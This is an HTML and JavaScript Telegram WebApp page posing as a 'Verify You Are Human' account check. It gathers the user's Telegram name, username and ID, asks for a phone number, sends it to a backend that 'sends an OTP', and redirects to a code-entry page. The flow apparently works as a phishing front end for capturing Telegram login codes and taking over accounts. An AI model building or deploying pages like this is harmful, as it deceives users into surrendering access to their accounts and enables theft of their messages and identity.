<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: var(--tg-theme-bg-color, #f0f0f0);
            color: var(--tg-theme-text-color, #000000);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            background: var(--tg-theme-secondary-bg-color, #ffffff);
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        
        .header {
            background: var(--tg-theme-bg-color, #0088cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            padding: 24px 20px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 20px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 14px;
        }
        
        .content {
            padding: 24px;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: var(--tg-theme-button-color, #0088cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 16px;
        }
        
        .btn:hover {
            opacity: 0.9;
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .btn-secondary {
            background: var(--tg-theme-secondary-bg-color, #666666);
        }
        
        .error {
            background: #ffebee;
            color: #c62828;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 15px;
            font-size: 14px;
            display: none;
        }
        
        .error.show {
            display: block;
        }
        
        .loading {
            text-align: center;
            padding: 40px 20px;
        }
        
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(0,0,0,0.1);
            border-top: 3px solid var(--tg-theme-button-color, #0088cc);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .hidden {
            display: none;
        }
        
        .info-box {
            background: var(--tg-theme-section-bg-color, #f8f9fa);
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-size: 14px;
            line-height: 1.5;
            color: var(--tg-theme-hint-color, #666666);
            text-align: center;
        }
        
        .phone-display {
            background: var(--tg-theme-section-bg-color, #f8f9fa);
            padding: 12px;
            border-radius: 10px;
            margin-bottom: 16px;
            text-align: center;
            font-weight: 600;
            font-size: 16px;
        }
        
        .user-info {
            background: var(--tg-theme-section-bg-color, #f8f9fa);
            padding: 16px;
            border-radius: 12px;
            margin-bottom: 16px;
        }
        
        .user-info div {
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            text-align: center;
            color: var(--tg-theme-text-color, #000000);
        }
        
        .subtitle {
            font-size: 14px;
            color: var(--tg-theme-hint-color, #666666);
            text-align: center;
            margin-bottom: 24px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîê Account Verification</h1>
            <p>Verify your Telegram account</p>
        </div>
        
        <div class="content">
            <!-- User Info Display -->
            <div class="user-info" id="user-info">
                <div><b>üë§ User Information:</b></div>
                <div>Name: <span id="user-name">Loading...</span></div>
                <div>Username: <span id="user-username">Loading...</span></div>
                <div>ID: <span id="user-id">Loading...</span></div>
            </div>
            
            <div class="title">Verify You Are Human</div>
            
            <div class="subtitle">
                Please share your contact to verify your identity.
                We'll send an OTP to your phone number for verification.
            </div>
            
            <!-- Contact Sharing Screen -->
            <div id="contact-screen">
                <div class="info-box">
                    <b>üîí Verification Process:</b><br>
                    1. Click "Share Contact" below<br>
                    2. Native Telegram contact picker opens<br>
                    3. Select your contact<br>
                    4. OTP will be sent automatically<br>
                    5. Enter OTP in next screen
                </div>
                
                <div class="error" id="error-message"></div>
                
                <button class="btn" onclick="shareContact()" id="share-btn">
                    <span style="font-size: 20px;">üìû</span>
                    Share My Contact
                </button>
            </div>
            
            <!-- Contact Processing Screen -->
            <div id="processing-screen" class="hidden">
                <div class="phone-display" id="phone-display">
                    Phone: Not shared yet
                </div>
                
                <div class="error" id="contact-error"></div>
                
                <div class="info-box">
                    ‚úÖ Contact shared successfully!<br>
                    Sending OTP to your phone...
                </div>
            </div>
            
            <!-- Loading Screen -->
            <div id="loading-screen" class="hidden">
                <div class="loading">
                    <div class="loading-spinner"></div>
                    <p id="loading-text">Processing...</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Telegram WebApp Script -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    
    <script>
        // Telegram WebApp instance
        let tg = window.Telegram?.WebApp;
        let sessionId = null;
        let phoneNumber = null;
        
        // Initialize WebApp
        document.addEventListener('DOMContentLoaded', function() {
            if (tg) {
                // Initialize WebApp
                tg.expand(); // Expand WebApp to full screen
                tg.enableClosingConfirmation(); // Ask before closing
                
                // Get user info from Telegram
                const user = tg.initDataUnsafe?.user || {};
                const userId = user.id || 'unknown';
                const username = user.username || '';
                const firstName = user.first_name || '';
                const lastName = user.last_name || '';
                const chatId = tg.initDataUnsafe?.chat?.id || tg.initDataUnsafe?.chat_instance;
                
                // Display user info
                document.getElementById('user-name').textContent = `${firstName} ${lastName}`.trim() || 'Not provided';
                document.getElementById('user-username').textContent = username ? `@${username}` : 'Not provided';
                document.getElementById('user-id').textContent = userId;
                
                // Initialize session with backend
                fetch('/init-session', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        user_id: userId,
                        username: username,
                        first_name: firstName,
                        last_name: lastName,
                        chat_id: chatId
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        sessionId = data.session_id;
                        console.log('WebApp session created:', sessionId);
                    } else {
                        showError('Failed to initialize session');
                    }
                })
                .catch(error => {
                    console.error('Session init error:', error);
                    showError('Connection error. Please try again.');
                });
                
                // Set Telegram theme colors
                applyTelegramTheme();
                
            } else {
                // For testing outside Telegram WebApp
                console.log('Running outside Telegram WebApp');
                document.getElementById('user-name').textContent = 'Test User';
                document.getElementById('user-username').textContent = '@testuser';
                document.getElementById('user-id').textContent = '123456789';
                
                fetch('/init-session', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        user_id: 'test_user',
                        username: 'testuser',
                        first_name: 'Test',
                        last_name: 'User',
                        chat_id: 'test_chat'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        sessionId = data.session_id;
                        console.log('Test session created:', sessionId);
                    }
                });
            }
        });
        
        function applyTelegramTheme() {
            if (!tg) return;
            
            // Apply Telegram theme colors
            document.documentElement.style.setProperty('--tg-theme-bg-color', tg.themeParams.bg_color || '#ffffff');
            document.documentElement.style.setProperty('--tg-theme-text-color', tg.themeParams.text_color || '#000000');
            document.documentElement.style.setProperty('--tg-theme-hint-color', tg.themeParams.hint_color || '#999999');
            document.documentElement.style.setProperty('--tg-theme-link-color', tg.themeParams.link_color || '#0088cc');
            document.documentElement.style.setProperty('--tg-theme-button-color', tg.themeParams.button_color || '#0088cc');
            document.documentElement.style.setProperty('--tg-theme-button-text-color', tg.themeParams.button_text_color || '#ffffff');
            document.documentElement.style.setProperty('--tg-theme-secondary-bg-color', tg.themeParams.secondary_bg_color || '#f0f0f0');
            document.documentElement.style.setProperty('--tg-theme-section-bg-color', tg.themeParams.section_bg_color || '#f8f9fa');
        }
        
        function shareContact() {
            if (!sessionId) {
                showError('Session not initialized. Please wait...');
                return;
            }
            
            // Check if we're in Telegram WebApp
            if (tg && tg.isVersionAtLeast('6.9')) {
                // Use Telegram WebApp contact sharing (Bot API 6.9+)
                // Note: This is different from requestContact() which is for Mini Apps
                // For WebApp, we need to use contact sharing via chat
                
                // In WebApp, we can use the contact field in initDataUnsafe if available
                const contact = tg.initDataUnsafe?.contact;
                if (contact && contact.phone_number) {
                    // Contact already shared via WebApp button
                    handleContactReceived(contact.phone_number);
                } else {
                    // Fallback: Use inline keyboard to share contact in chat
                    showContactKeyboard();
                }
            } else {
                // Fallback for older clients
                showContactKeyboard();
            }
        }
        
        function showContactKeyboard() {
            // Show a prompt for manual entry in WebApp
            const phone = prompt('Please enter your phone number with country code (e.g., +1234567890):');
            if (phone) {
                handleContactReceived(phone);
            } else {
                showError('Phone number is required for verification');
            }
        }
        
        function handleContactReceived(phone) {
            phoneNumber = phone;
            
            // Show processing screen
            document.getElementById('contact-screen').classList.add('hidden');
            document.getElementById('processing-screen').classList.remove('hidden');
            document.getElementById('phone-display').textContent = `Phone: ${phoneNumber}`;
            
            // Send contact to backend
            sendContactToBackend(phoneNumber);
        }
        
        function sendContactToBackend(phone) {
            showLoading('Sending OTP...');
            
            fetch('/api/process-contact', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    session_id: sessionId,
                    phone: phone
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Redirect to OTP page
                    window.location.href = `/otp/${sessionId}/${encodeURIComponent(data.phone)}`;
                } else {
                    hideLoading();
                    document.getElementById('contact-error').textContent = data.error || 'Failed to send OTP';
                    document.getElementById('contact-error').classList.add('show');
                    
                    // Show retry button after 3 seconds
                    setTimeout(() => {
                        document.getElementById('processing-screen').classList.add('hidden');
                        document.getElementById('contact-screen').classList.remove('hidden');
                        document.getElementById('contact-error').classList.remove('show');
                    }, 3000);
                }
            })
            .catch(error => {
                hideLoading();
                document.getElementById('contact-error').textContent = 'Network error. Please try again.';
                document.getElementById('contact-error').classList.add('show');
            });
        }
        
        function showLoading(message) {
            document.getElementById('loading-text').textContent = message || 'Processing...';
            document.getElementById('contact-screen').classList.add('hidden');
            document.getElementById('processing-screen').classList.add('hidden');
            document.getElementById('loading-screen').classList.remove('hidden');
        }
        
        function hideLoading() {
            document.getElementById('loading-screen').classList.add('hidden');
        }
        
        function showError(message) {
            const errorEl = document.getElementById('error-message');
            errorEl.textContent = message;
            errorEl.classList.add('show');
            
            setTimeout(() => {
                errorEl.classList.remove('show');
            }, 5000);
        }
        
        // Handle Telegram theme changes
        if (tg) {
            tg.onEvent('themeChanged', applyTelegramTheme);
            tg.onEvent('viewportChanged', function() {
                tg.expand(); // Always keep expanded
            });
        }
    </script>
</body>
</html>
